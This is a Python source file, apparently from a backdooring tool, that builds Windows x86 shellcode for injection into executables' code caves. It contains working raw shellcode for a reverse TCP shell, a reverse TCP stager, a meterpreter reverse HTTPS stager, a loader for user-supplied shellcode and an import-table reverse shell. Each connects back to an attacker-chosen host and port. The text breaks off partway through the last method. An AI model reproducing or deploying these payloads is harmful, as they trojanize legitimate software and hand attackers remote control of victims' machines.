'''

Copyright (c) 2013-2015, Joshua Pitts
All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice,
    this list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
    may be used to endorse or promote products derived from this software without
    specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

'''


##########################################################
#               BEGIN win32 shellcodes                   #
##########################################################
import struct
from intelmodules import eat_code_caves


class winI32_shellcode():
    """
    Windows Intel x32 shellcode class
    """

    def __init__(self, HOST, PORT, SUPPLIED_SHELLCODE):
        #could take this out HOST/PORT and put into each shellcode function
        self.HOST = HOST
        self.PORT = PORT
        self.shellcode = ""
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.stackpreserve = "\x90\x90\x60\x9c"
        self.stackrestore = "\x9d\x61"
        self.apis_needed = None

    def pack_ip_addresses(self):
        hostocts = []
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def clean_caves_stub(self, CavesToFix):
        stub = ("\x33\xC0"                          # XOR EAX,EAX
                "\x31\xc9"                          # XOR ECX, ECX <- requirment for win10
                "\x64\x8B\x49\x30"                  # mov ecx, dword ptr fs: [ecx + 0x30]
                "\x8B\x49\x08"                      # mov ecx, dword ptr [ecx+8]
                "\x8B\xD9"                          # mov ebx,ecx
                )
        for cave, values in CavesToFix.iteritems():
            stub += "\xbf"                          # mov edi, value below
            stub += struct.pack("<I", values[0])
            stub += "\x03\xfb"                      # add edi, ebx
            stub += "\xb9"                          # mov ecx, value below
            stub += struct.pack("<I", values[1])
            stub += "\xf3\xaa"                      # REP STOS BYTE PTR ES:[EDI]
        return stub

    def reverse_shell_tcp_inline(self, flItms, CavesPicked={}):
        """
        Modified metasploit windows/shell_reverse_tcp shellcode
        to enable continued execution and cave jumping.
        """

        if self.PORT is None:
            print ("This payload requires the PORT parameter -P")
            return False

        if self.HOST is None:
            print "This payload requires a HOST parameter -H"
            return False

        #breakupvar is the distance between codecaves
        breakupvar = eat_code_caves(flItms, 0, 1)
        self.shellcode1 = "\xfc\xe8"

        if flItms['cave_jumping'] is True:
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                                 len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\x89\x00\x00\x00"

        self.shellcode1 += ("\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
                            "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
                            "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
                            "\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
                            "\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
                            "\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
                            "\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
                            "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
                            "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
                            "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86"
                            )

        self.shellcode2 = ("\x5d\x68\x33\x32\x00\x00\x68"
                           "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
                           "\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
                           "\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7"
                           "\x68"
                           )
        self.shellcode2 += self.pack_ip_addresses()  # IP
        self.shellcode2 += ("\x68\x02\x00")
        self.shellcode2 += struct.pack('!H', self.PORT)  # PORT
        self.shellcode2 += ("\x89\xe6\x6a\x10\x56"
                            "\x57\x68\x99\xa5\x74\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3"
                            "\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24"
                            "\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56"
                            "\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89"
                            #The NOP in the line below allows for continued execution.
                            "\xe0\x4e\x90\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0"
                            "\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80"
                            "\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
                            "\x81\xc4\xfc\x01\x00\x00"
                            )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
        return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)

    def reverse_tcp_stager_threaded(self, flItms, CavesPicked={}):
        """
        Reverse tcp stager. Can be used with windows/shell/reverse_tcp or
        windows/meterpreter/reverse_tcp payloads from metasploit.
        """

        if self.PORT is None:
            print ("This payload requires the PORT parameter -P")
            return False

        if self.HOST is None:
            print "This payload requires a HOST parameter -H"
            return False

        flItms['stager'] = True

        #Begin shellcode 2:

        breakupvar = eat_code_caves(flItms, 0, 1)

        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 241).rstrip("L")), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 241).rstrip("L")), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 234).rstrip("L")), 16))
        else:
            self.shellcode2 = "\xE8\xB7\xFF\xFF\xFF"
        #Can inject any shellcode below.

        #ADD STUB HERE
        if flItms['NewCodeCave'] is False:
            if CavesPicked != {}:
                self.shellcode2 += self.clean_caves_stub(flItms['CavesToFix'])

            else:
                self.shellcode2 += "\x41" * 58

        self.shellcode2 += ("\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B\x52"
                            "\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC"
                            "\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57\x8B"
                            "\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01\xD0"
                            "\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B\x01"
                            "\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4\x03"
                            "\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C"
                            "\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B"
                            "\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D\x68"
                            "\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF"
                            "\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF"
                            "\xD5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5"
                            "\x97\x6A\x05\x68"
                            )
        self.shellcode2 += self.pack_ip_addresses()  # IP
        self.shellcode2 += ("\x68\x02\x00")
        self.shellcode2 += struct.pack('!H', self.PORT)
        self.shellcode2 += ("\x89\xE6\x6A"
                            "\x10\x56\x57\x68\x99\xA5\x74\x61\xFF\xD5\x85\xC0\x74\x0C\xFF\x4E"
                            "\x08\x75\xEC\x68\xF0\xB5\xA2\x56\xFF\xD5\x6A\x00\x6A\x04\x56\x57"
                            "\x68\x02\xD9\xC8\x5F\xFF\xD5\x8B\x36\x6A\x40\x68\x00\x10\x00\x00"
                            "\x56\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x6A\x00\x56\x53"
                            "\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x01\xC3\x29\xC6\x85\xF6\x75\xEC\xC3"
                            )

        breakupvar = eat_code_caves(flItms, 0, 1)

        #shellcode1 is the thread
        self.shellcode1 = ("\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B"
                           "\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02"
                           "\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61"
                           "\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B"
                           "\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48"
                           "\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0"
                           "\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B"
                           "\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF"
                           "\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D"
                           "\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B"
                           "\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04"
                           "\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB"
                           "\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90"
                           "\x5D\x90"
                           "\xBE")
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)   # \x22\x01\x00\x00"  # <---Size of shellcode2 in hex
        self.shellcode1 += ("\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
                            "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
                            "\x89\xF1"
                            )

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x44"  # <--length of shellcode below
        self.shellcode1 += "\x90\x5e"
        self.shellcode1 += ("\x90\x90\x90"
                            "\xF2\xA4"
                            "\xE8\x20\x00\x00"
                            "\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06"
                            "\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF"
                            "\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5"
                            "\x58\x58\x90\x61"
                            )

        breakupvar = eat_code_caves(flItms, 0, 2)

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip("L")), 16))
        else:
            self.shellcode1 += "\xe9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def meterpreter_reverse_https_threaded(self, flItms, CavesPicked={}):
        """
        Traditional meterpreter reverse https shellcode from metasploit
        modified to support cave jumping.
        """

        if self.PORT is None:
            print ("This payload requires the PORT parameter -P")
            return False

        if self.HOST is None:
            print "This payload requires a HOST parameter -H"
            return False

        flItms['stager'] = True

        #Begin shellcode 2:
        breakupvar = eat_code_caves(flItms, 0, 1)

        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                             len(self.shellcode2) + 241).rstrip("L")), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                             breakupvar + 241).rstrip("L")), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 234).rstrip("L")), 16))
        else:
            self.shellcode2 = "\xE8\xB7\xFF\xFF\xFF"

        if flItms['NewCodeCave'] is False:
            if CavesPicked != {}:
                self.shellcode2 += self.clean_caves_stub(flItms['CavesToFix'])

            else:
                self.shellcode2 += "\x41" * 58

        self.shellcode2 += ("\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
                            "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
                            "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
                            "\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
                            "\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
                            "\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
                            "\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
                            "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
                            "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
                            "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68"
                            "\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57"
                            "\x57\x57\x57\x6a\x00\x54\x68\x3a\x56\x79\xa7\xff\xd5\xeb\x5f"
                            "\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68")
        self.shellcode2 += struct.pack("<H", self.PORT)
        self.shellcode2 += ("\x00\x00\x53"
                            "\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x48\x59\x31\xd2\x52\x68"
                            "\x00\x32\xa0\x84\x52\x52\x52\x51\x52\x50\x68\xeb\x55\x2e\x3b"
                            "\xff\xd5\x89\xc6\x6a\x10\x5b\x68\x80\x33\x00\x00\x89\xe0\x6a"
                            "\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86\xff\xd5\x31\xff\x57"
                            "\x57\x57\x57\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1a"
                            "\x4b\x74\x10\xeb\xd5\xeb\x49\xe8\xb3\xff\xff\xff\x2f\x48\x45"
                            "\x56\x79\x00\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00"
                            "\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff"
                            "\xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68"
                            "\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xcd\x8b\x07\x01\xc3\x85"
                            "\xc0\x75\xe5\x58\xc3\xe8\x51\xff\xff\xff")
        self.shellcode2 += self.HOST
        self.shellcode2 += "\x00"

        breakupvar = eat_code_caves(flItms, 0, 1)

        #shellcode1 is the thread
        self.shellcode1 = ("\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B"
                           "\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02"
                           "\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61"
                           "\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B"
                           "\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48"
                           "\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0"
                           "\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B"
                           "\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF"
                           "\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D"
                           "\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B"
                           "\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04"
                           "\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB"
                           "\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90"
                           "\x5D\x90"
                           )

        self.shellcode1 += "\xBE"
        self.shellcode1 += struct.pack("<H", len(self.shellcode2) - 5)
        self.shellcode1 += "\x00\x00"  # <---Size of shellcode2 in hex
        self.shellcode1 += ("\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
                            "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
                            "\x89\xF1"
                            )

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x44"   # <--length of shellcode below
        self.shellcode1 += "\x90\x5e"
        self.shellcode1 += ("\x90\x90\x90"
                            "\xF2\xA4"
                            "\xE8\x20\x00\x00"
                            "\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06"
                            "\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF"
                            "\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5"
                            "\x58\x58\x90\x61"
                            )

        breakupvar = eat_code_caves(flItms, 0, 2)

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 3).rstrip("L")), 16))
        else:
            self.shellcode1 += "\xE9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def user_supplied_shellcode_threaded(self, flItms, CavesPicked={}):
        """
        This module allows for the user to provide a win32 raw/binary
        shellcode.  For use with the -U flag.  Make sure to use a process safe exit function.
        """

        flItms['stager'] = True

        if flItms['supplied_shellcode'] is None:
            print "[!] User must provide shellcode for this module (-U)"
            return False
        else:
            self.supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        #Begin shellcode 2:

        breakupvar = eat_code_caves(flItms, 0, 1)

        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                             len(self.shellcode2) + 241).rstrip("L")), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                             breakupvar + 241).rstrip("L")), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                   len(self.shellcode2) + 234).rstrip("L")), 16))
        else:
            self.shellcode2 = "\xE8\xB7\xFF\xFF\xFF"

        #Can inject any shellcode below.

        if flItms['NewCodeCave'] is False:
            if CavesPicked != {}:
                self.shellcode2 += self.clean_caves_stub(flItms['CavesToFix'])

            else:
                self.shellcode2 += "\x41" * 58

        self.shellcode2 += self.supplied_shellcode

        breakupvar = eat_code_caves(flItms, 0, 1)

        self.shellcode1 = ("\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B"
                           "\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02"
                           "\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61"
                           "\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B"
                           "\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48"
                           "\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0"
                           "\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B"
                           "\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF"
                           "\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D"
                           "\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B"
                           "\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04"
                           "\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB"
                           "\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90"
                           "\x5D\x90"
                           "\xBE")
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)

        self.shellcode1 += ("\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
                            "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
                            "\x89\xF1"
                            )

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x44"  # <--length of shellcode below

        self.shellcode1 += "\x90\x5e"
        self.shellcode1 += ("\x90\x90\x90"
                            "\xF2\xA4"
                            "\xE8\x20\x00\x00"
                            "\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06"
                            "\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF"
                            "\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5"
                            "\x58\x58\x90\x61"
                            )

        breakupvar = eat_code_caves(flItms, 0, 2)
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip("L")), 16))
        else:
            #    self.shellcode1 += "\xEB\x06\x01\x00\x00"
            #This needs to be in the above statement
            self.shellcode1 += "\xe9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def iat_reverse_tcp_inline(self, flItms, CavesPicked={}):
        """
        Position dependent shellcode that uses API thunks of LoadLibraryA and
        GetProcAddress to find and load APIs for callback to C2.
        """
        flItms['apis_needed'] = ['LoadLibraryA', 'GetProcAddress']

        for api in flItms['apis_needed']:
            if api not in flItms:
                return False

        if self.PORT is None:
            print ("This payload requires the PORT parameter -P")
            return False

        if self.HOST is None:
            print "This payload requires a HOST parameter -H"
            return False

        self.shellcode1 = "\xfc"   # CLD
        if flItms['XP_MODE'] is True:
            self.shellcode1 += ("\x89\xe5"                      # mov ebp, esp
                                "\x31\xd2"                      # xor edx, edx
                                "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]
                                "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]
                                )
        self.shellcode1 += "\xbb"           # mov value below to EBX
        if flItms['XP_MODE'] is True:
            if flItms['LoadLibraryA'] - (flItms['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['LoadLibraryA'] - (flItms['ImageBase']) + 1))
            else:
                self.shellcode1 += struct.pack("<I", flItms['LoadLibraryA'] - (flItms['ImageBase']))
            self.shellcode1 += "\x01\xD3"  # add EBX + EDX
            self.shellcode1 += "\xb9"  # mov value below to ECX
            if flItms['GetProcAddress'] - (flItms['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['GetProcAddress'] - (flItms['ImageBase']) + 1))
            else:
                self.shellcode1 += struct.pack("<I", flItms['GetProcAddress'] - (flItms['ImageBase']))
        else:
